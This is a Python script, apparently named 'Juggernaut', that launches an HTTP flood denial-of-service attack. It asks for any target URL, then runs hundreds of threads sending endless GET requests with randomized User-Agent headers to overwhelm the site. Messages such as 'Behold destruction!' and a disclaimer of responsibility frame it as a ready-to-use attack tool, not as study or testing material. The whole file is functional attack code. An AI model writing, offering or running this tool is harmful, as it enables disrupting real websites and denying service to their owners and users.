import sys
import signal
import requests
import threading
import random
import readline

BL = '\033[34m' # blue
P = '\033[35m' # purple
R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white
Y = '\033[33m'  # yellow
B = '\033[1m'  # bold
NB = '\033[0m'  # not bold
colors = [G, C, R, P, BL]

banner = f'''{random.choice(colors)}
     ██╗ ██╗   ██╗  ██████╗   ██████╗  ███████╗ ██████╗  ███╗   ██╗  █████╗  ██╗   ██╗ ████████╗
     ██║ ██║   ██║ ██╔════╝  ██╔════╝  ██╔════╝ ██╔══██╗ ████╗  ██║ ██╔══██╗ ██║   ██║ ╚══██╔══╝
     ██║ ██║   ██║ ██║  ███╗ ██║  ███╗ █████╗   ██████╔╝ ██╔██╗ ██║ ███████║ ██║   ██║    ██║   
██   ██║ ██║   ██║ ██║   ██║ ██║   ██║ ██╔══╝   ██╔══██╗ ██║╚██╗██║ ██╔══██║ ██║   ██║    ██║   
╚█████╔╝ ╚██████╔╝ ╚██████╔╝ ╚██████╔╝ ███████╗ ██║  ██║ ██║ ╚████║ ██║  ██║ ╚██████╔╝    ██║   
 ╚════╝   ╚═════╝   ╚═════╝   ╚═════╝  ╚══════╝ ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═╝  ╚═╝  ╚═════╝     ╚═╝   
{W}                                                                                                                            
'''
print(banner)

def kill_program(signum, frame):
    print("Exiting program, bye")
    while True:
        sys.exit(0)

signal.signal(signal.SIGINT, kill_program)

def load_agents():
    file = open("agents.txt")
    lines = file.readlines()
    for i in range(len(lines)):
        lines[i] = lines[i][:-2]

    return lines

print(
    f"{Y}Note: Keep on pressing CTRL + C or close the terminal when you want to stop attack{W}\n")
print(f"{R}{B}WARNING: I AM NOT RESPONSIBLE FOR YOUR ACTS{NB}{W}\n")
agents = load_agents()
print(f"{C}User-Agents Loaded!{W}")


def set_headers():
    return {
        "Host": host,
        "User-Agent": random.choice(agents),
        "Accept-Language": "en-us",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache",
        "Keep-Alive": str(random.randint(110, 120))
    }

def AttackWithoutProxy():
    while True:
        try:
            requests.get(site, headers=set_headers())
        except requests.exceptions.InvalidHeader:
            continue
        except KeyboardInterrupt:
            sys.exit(0)


print()
site = input("Enter url of the site you want to attack: ")

host = site
if "http://" in host:
    host = host.replace("http://", '')

elif "https://" in host:
    host = host.replace("https://", '')

if "www." in host:
    pass
else:
    host = "www." + host

try:
    print(f"{C}Checking authenticity of the url{W}")
    requests.get(site)

except KeyboardInterrupt:
    sys.exit(0)

except Exception as e:
    print(e)
    exit()
print(f"{G}The url is valid{W}")

threads = input("Enter the number of threads you want to use(default:500): ")

if threads == '':
    threads = 500

else:
    try:
        threads = int(threads)
    except ValueError:
        print(f"{R}A number was expected{W}")
        sys.exit(0)

    if int(threads) <= 0:
        print(f"{R}Number of threads cannot be < 1{W}")

print(f"\n{G}Starting attack, please wait{W}\n")
for i in range(threads):
    threading.Thread(target=AttackWithoutProxy, daemon=True).start()

print(f"{C}Attack Started, Behold destruction!{W}")

# main thread
while True:
    try:
        requests.get(site, headers=set_headers())
    except requests.exceptions.InvalidHeader:
        continue
    except KeyboardInterrupt:
        sys.exit(0)
